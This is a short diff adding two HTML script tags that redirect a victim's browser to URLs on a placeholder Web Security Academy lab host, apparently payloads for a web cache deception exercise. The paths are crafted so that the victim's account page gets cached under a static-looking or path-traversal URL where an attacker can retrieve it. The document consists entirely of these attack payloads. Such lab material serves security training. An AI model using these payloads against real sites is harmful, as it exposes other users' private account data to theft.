@@ -1,0 +1,2 @@
+<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
+<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
